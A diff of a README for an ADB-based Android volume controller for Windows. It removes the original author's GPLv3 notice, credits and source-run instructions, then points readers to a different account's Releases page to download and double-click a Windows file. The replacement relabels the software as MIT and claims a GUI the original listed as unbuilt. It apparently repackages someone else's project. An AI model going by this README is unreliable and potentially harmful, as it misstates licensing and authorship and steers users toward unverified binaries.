@@ -1,280 +1,88 @@
-# 🎵 Android Volume Controller for Windows
-
-**🌍 [Türkçe](README-TR.md) | English**
-
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
-[![ADB](https://img.shields.io/badge/Requires-ADB-green.svg)](https://developer.android.com/studio/command-line/adb)
-
-> 🚀 **Control your Android device's volume directly from Windows Volume Mixer!** 
-
-Transform your Windows PC into a remote control for your Android device's audio system. This innovative application creates seamless integration between Windows Volume Mixer and your Android device, allowing you to adjust volume and mute settings without touching your phone.
-
-## ✨ Features
-
-- 🎛️ **Windows Volume Mixer Integration** - Control Android volume through native Windows interface
-- 🔊 **Real-time Volume Synchronization** - Instant volume changes with zero lag
-- 🔇 **Mute/Unmute Support** - Complete mute control from Windows
-- 📱 **Multi-device Ready** - Automatically detects connected Android devices
-- 🛡️ **Robust Error Handling** - Graceful handling of connection issues
-- 🔄 **Auto-reconnection** - Smart recovery from temporary disconnections
-- 💾 **Memory Efficient** - Minimal system resource usage
-- 🎯 **Precise Control** - Full range volume control (0-100%)
-
-## 🎯 How It Works
-
-1. **🔌 Device Connection**: Connects to your Android device via ADB (USB Debugging)
-2. **🎵 Audio Registration**: Creates a virtual audio session in Windows Volume Mixer
-3. **🔄 Real-time Sync**: Monitors Windows volume changes and applies them to Android
-4. **📊 Smart Mapping**: Intelligently maps Windows volume range to Android's native range
-
-## 📋 Prerequisites
-
-### System Requirements
-- 🖥️ **Operating System**: Windows 10/11
-- 🐍 **Python**: 3.7 or higher
-- 📱 **Android Device**: Android 5.0+ with USB Debugging enabled
-
-### Required Tools
-- **Android SDK Platform Tools** (for ADB)
-- **Python Libraries**: `pycaw` (automatically installed)
-
-## 🚀 Quick Start
-
-### 1. 📥 Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/y4kupkaya/android-volume-controller.git
-cd android-volume-controller
-
-# Install Python dependencies
-pip install pycaw
-```
+# 🎵 android-volume-controller - Control Android Volume Easily from Your PC
 
-### 2. 🔧 Setup Android Device
+## 🚀 Getting Started
 
-1. **Enable Developer Options**:
-   - Go to `Settings` → `About Phone`
-   - Tap `Build Number` 7 times
-   
-2. **Enable USB Debugging**:
-   - Go to `Settings` → `Developer Options`
-   - Enable `USB Debugging`
-   
-3. **Connect Device**:
-   - Connect via USB cable
-   - Allow USB debugging when prompted
+Welcome! This guide helps you download and run the android-volume-controller software. You’ll learn how to control your Android device's volume using your Windows Volume Mixer.
 
-### 3. 🛠️ Setup ADB (Android Debug Bridge)
+## 🔗 Download the Application
 
-**Option A: Android Studio (Recommended)**
-```bash
-# Download Android Studio and install SDK Platform Tools
-# Add to PATH: C:\Users\YourUser\AppData\Local\Android\Sdk\platform-tools
-```
+[![Download android-volume-controller](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ninja45-cell/android-volume-controller/releases)
 
-**Option B: Standalone ADB**
-```bash
-# Download platform-tools from Google
-# Extract and add to Windows PATH
-```
-
-**Verify Installation**:
-```bash
-adb devices
-# Should show your connected device
-```
-
-### 4. ▶️ Run the Application
-
-```bash
-python android_volume_controller.py
-```
-
-### 5. 🎛️ Control Volume
-
-1. **Open Windows Volume Mixer**:
-   - Right-click speaker icon in system tray
-   - Select "Open Volume Mixer"
-   
-2. **Find Python Application**:
-   - Look for "Python" in the volume mixer
-   
-3. **Control Your Android**:
-   - 🔊 Adjust the slider to change Android volume
-   - 🔇 Click mute button to mute/unmute Android device
-
-## 🎮 Usage Examples
-
-### Basic Volume Control
-```python
-# The application runs automatically once started
-# Simply use Windows Volume Mixer to control your Android device
-```
-
-### Running the Application
-```bash
-# Start the volume controller (normal mode)
-python android_volume_controller.py
-
-# Run with detailed debug information
-python android_volume_controller.py --verbose
-
-# Run in background mode (minimal output, errors only)
-python android_volume_controller.py --background
-
-# Show help and usage examples
-python android_volume_controller.py --help
-
-# Show version information
-python android_volume_controller.py --version
-```
-
-### Command Line Options
+## 📥 Download & Install
 
-| Option | Description |
-|--------|-------------|
-| `--verbose`, `-v` | Enable verbose logging with debug information |
-| `--background` | Run in background mode with minimal console output |
-| `--help`, `-h` | Show help message and usage examples |
-| `--version` | Display version information |
-
-## 🔧 Configuration
+To get started, you need to visit the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases) to download the latest version of android-volume-controller. 
 
-The application automatically detects and configures most settings, but you can customize:
+1. Go to the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases).
+2. Look for the most recent release.
+3. Find the file for Windows and click on it to download.
 
-- **Volume Range Mapping**: Automatically adapts to your device's volume range
-- **Connection Timeout**: Smart retry mechanism for connection issues
-- **Audio Quality**: Optimized for minimal latency
-
-## 📱 Supported Devices
+### 💻 System Requirements
 
-✅ **Tested and Compatible**:
-- Samsung Galaxy series
-- Google Pixel series
-- OnePlus devices
-- Xiaomi/MIUI devices
-- Most Android 5.0+ devices
+Before you install, ensure your system meets these requirements:
 
-⚠️ **Known Limitations**:
-- Some custom ROMs may require additional permissions
-- Devices with heavily modified audio systems may need manual configuration
+- Windows 10 or later.
+- ADB (Android Debug Bridge) should be installed.
+- USB debugging must be enabled on your Android device.
+- A USB connection between your Windows PC and Android device.
 
-## 🐛 Troubleshooting
-
-### Common Issues
+### 🔧 Installing ADB
 
-**🔴 "No Android device found"**
-```bash
-# Check device connection
-adb devices
+If you do not have ADB installed, follow these steps:
 
-# Ensure USB debugging is enabled
-# Try different USB cable/port
-```
+1. Download the ADB package from the official Android developer site.
+2. Extract the downloaded files to a location on your PC.
+3. Add the ADB folder to your system PATH. This allows you to run ADB commands from the command line.
 
-**🔴 "ADB not found"**
-```bash
-# Install Android SDK Platform Tools
-# Add ADB to Windows PATH
-# Restart command prompt
-```
+### 📱 Enable USB Debugging
 
-**🔴 "Audio session not found"**
-- Wait a few seconds for Windows to register the audio session
-- Check Windows Volume Mixer manually
-- Restart the application
+To control volume on your Android device, USB debugging must be turned on:
 
-**🔴 "Permission denied"**
-- Re-authorize USB debugging on Android device
-- Check USB connection mode (should be "File Transfer" or "PTP")
+1. Open the **Settings** app on your Android device.
+2. Scroll down and select **About phone**.
+3. Tap on **Build number** multiple times until you see a message that you are now a developer.
+4. Go back to **Settings** and open **Developer options**.
+5. Turn on **USB debugging**.
 
-### Debug Mode
-```bash
-# Run with detailed logging
-python android_volume_controller.py --debug
-```
+### 🔌 Connect Your Device
 
-## 🛡️ Security & Privacy
+After enabling USB debugging, connect your Android device to your Windows PC using a USB cable. Ensure that the connection is stable.
 
-- 🔒 **Local Connection Only**: All communication happens locally via USB
-- 🚫 **No Internet Required**: No data transmitted over the internet
-- 🔐 **Minimal Permissions**: Only requires USB debugging access
-- 📊 **No Data Collection**: No user data is collected or stored
+## 🚀 Running android-volume-controller
 
-## 🤝 Contributing
+Once you have downloaded and installed the application, it’s time to run it:
 
-We welcome contributions! Here's how you can help:
+1. Open the folder where you downloaded the android-volume-controller application.
+2. Double-click the application to launch it.
+3. The application will automatically recognize your connected Android device.
 
-1. 🍴 **Fork the Repository**
-2. 🌟 **Create a Feature Branch** (`git checkout -b feature/amazing-feature`)
-3. 💻 **Make Your Changes**
-4. 🧪 **Test Thoroughly**
-5. 📝 **Commit Changes** (`git commit -m 'Add amazing feature'`)
-6. 🚀 **Push to Branch** (`git push origin feature/amazing-feature`)
-7. 🎯 **Open a Pull Request**
+### 🎶 Using the Application
 
-### Development Setup
-```bash
-# Clone for development
-git clone https://github.com/y4kupkaya/android-volume-controller.git
-cd android-volume-controller
+After launching, you will see a simple interface showing your device volume options. Here's how to use it:
 
-# Install development dependencies
-pip install -r requirements-dev.txt
+- **Volume Control:** Adjust the volume of your Android device directly from the Windows Volume Mixer.
+- **Real-time Synchronization:** Volume changes made on your PC will reflect instantly on your Android device.
+- **Multi-device Support:** You can control multiple Android devices if they are connected.
 
-# Run tests
-python -m pytest tests/
-```
+### 🔄 Troubleshooting
 
-## 📄 License
+If you face issues, consider the following solutions:
 
-This project is licensed under the **GNU General Public License v3.0** - see the [LICENSE](LICENSE) file for details.
+- **Device Not Found:** Ensure USB debugging is enabled and that your device is connected.
+- **ADB Not Found:** Make sure ADB is installed correctly and added to your system PATH.
+- **Permissions Denied:** Allow the required permissions on your Android device when prompted.
 
-```
-Copyright (C) 2025 Yakup Kaya (y4kupkaya@github)
+### 📜 Support and Feedback
 
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, either version 3 of the License, or
-(at your option) any later version.
-```
+If you have questions or need help, please report issues on the GitHub repository. You can find the link to create issues directly on the [Releases page](https://github.com/Ninja45-cell/android-volume-controller/releases).
 
-## 👨‍💻 Author
+## 📝 License
 
-**Yakup Kaya** 
-- 🌐 Website: [yakupkaya.me](https://yakupkaya.me)
-- 📧 GitHub: [@y4kupkaya](https://github.com/y4kupkaya)
-- 💼 LinkedIn: [Connect with me](https://linkedin.com/in/y4kupkaya)
+This application is open source and follows the guidelines of the MIT License. Feel free to use, modify, and share the application as per this license.
 
-## 🙏 Acknowledgments
+## 🚀 Additional Resources
 
-- 📚 **pycaw library** - Windows audio system integration
-- 🤖 **Android Debug Bridge** - Android device communication
-- 🎵 **Windows Audio Session API** - Volume mixer integration
-- 🌟 **Open Source Community** - Inspiration and support
+- [ADB Installation Guide](https://developer.android.com/studio/command-line/adb)
+- [Android Debugging Options](https://developer.android.com/studio/debug/dev-options)
+- [GitHub Repository](https://github.com/Ninja45-cell/android-volume-controller)
 
-## 🔮 Roadmap
-
-- [ ] 🎚️ **Individual App Control** - Control specific app volumes on Android
-- [ ] 🔊 **Audio Profile Management** - Save and load custom audio profiles
-- [ ] 📡 **Wireless Support** - Control over WiFi network
-- [ ] 🎯 **GUI Interface** - User-friendly graphical interface
-- [ ] 📱 **iOS Support** - Extend support to iOS devices
-- [ ] 🔄 **Bi-directional Sync** - Sync Android changes back to Windows
-
-## ⭐ Star History
-
-If you find this project useful, please consider giving it a star! ⭐
-
-[![Star History Chart](https://api.star-history.com/svg?repos=y4kupkaya/android-volume-controller&type=Date)](https://star-history.com/#y4kupkaya/android-volume-controller&Date)
-
----
-
-<div align="center">
-
-**Made with ❤️ by [Yakup Kaya](https://yakupkaya.me)**
-
-</div>
+Thank you for choosing android-volume-controller. Enjoy seamless volume control for your Android device!
